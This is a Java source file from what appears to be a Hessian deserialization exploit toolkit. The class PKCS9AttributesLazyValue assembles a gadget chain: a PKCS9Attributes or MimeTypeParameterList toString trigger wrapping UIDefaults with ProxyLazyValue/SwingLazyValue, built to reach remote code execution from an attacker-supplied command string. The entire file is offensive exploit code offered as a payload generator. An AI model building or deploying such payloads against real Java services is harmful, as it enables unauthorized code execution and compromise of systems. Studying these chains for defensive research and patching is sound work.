package cn.butler.hessian.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.hessian.util.ToStringUtil;
import cn.butler.payloads.PayloadRunner;

import javax.swing.*;

import static cn.butler.hessian.util.Gadgets.makeRceGadgetsLazyValueTrigger;

/**
 * 调用栈:
 *
 */
public class PKCS9AttributesLazyValue implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2); //使用第一个冒号进行切割，限制切割为最多两个部分
        //创建UIDefaults对象,该对象封装ProxyLazyValue/SwingLazyValue来触发RceGadgets
        UIDefaults uiDefaults = makeRceGadgetsLazyValueTrigger(parts[1]);
        //创建PKCS9Attributes或MimeTypeParameterList对象,该对象封装UIDefaults
        Object target = ToStringUtil.makeLazyVlaueToStringTrigger(parts[0],uiDefaults);

//        byte[] bytes = Serializer.serializeExcept(equalsHashMap);
//        System.out.println(Arrays.toString(bytes));
//        Serializer.deserialize(bytes);
//        Serializer.deserializeLite(bytes);
        return target;
    }
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(PKCS9AttributesLazyValue.class, args);
    }
}
